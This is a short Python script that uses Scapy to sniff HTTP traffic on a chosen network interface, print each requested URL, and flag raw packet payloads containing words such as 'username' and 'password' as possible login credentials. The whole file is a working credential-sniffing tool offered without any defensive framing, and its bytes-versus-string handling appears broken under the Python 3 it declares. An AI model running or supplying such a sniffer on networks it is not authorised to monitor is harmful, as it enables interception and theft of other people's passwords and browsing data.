#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import argparse
import sys


def get_argument():  # fetch arguments for interface name
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface name (eth0)")  # arguments defined
    options = parser.parse_args()

    if len(sys.argv) <= 1:
        print('Error: No arguments')
        print('Type -h for help')
        exit(1)

    return options

keywords = ["username", "user", "login", "password", "pass"]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show()) # See all Packet layer fields
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

        

options = get_argument()
sniff(options.interface)